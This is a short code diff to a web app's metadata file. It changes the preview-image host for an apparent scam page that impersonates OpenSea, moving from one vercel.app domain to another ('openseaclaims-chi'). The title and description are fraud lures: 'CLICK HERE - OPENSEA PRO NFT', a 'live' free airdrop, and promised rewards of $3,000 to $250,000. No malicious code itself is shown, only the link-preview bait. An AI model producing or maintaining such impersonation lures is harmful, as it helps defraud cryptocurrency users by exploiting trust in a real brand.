@@ -13,7 +13,7 @@ export const metadata: Metadata = {
     siteName: "This is an automatically generated announcement message",
     images: [
       {
-        url: "https://tokens-giveaway25ksk.vercel.app/389-9bec97c22fa2e411.gif",
+        url: "https://openseaclaims-chi.vercel.app/389-9bec97c22fa2e411.gif",
         width: 800,
         height: 600,
         alt: "CLICK HERE - OPENSEA PRO NFT preview",
@@ -26,7 +26,7 @@ export const metadata: Metadata = {
     title: "CLICK HERE - OPENSEA PRO NFT",
     description:
       "AIRDROP IS LIVE NOW Price: FREE 389 Supply: 150 Mystery Box 389 Reward: between $3000 and $250,000",
-    images: ["https://tokens-giveaway25ksk.vercel.app/389-9bec97c22fa2e411.gif"],
+    images: ["https://openseaclaims-chi.vercel.app/389-9bec97c22fa2e411.gif"],
   },
 };
 
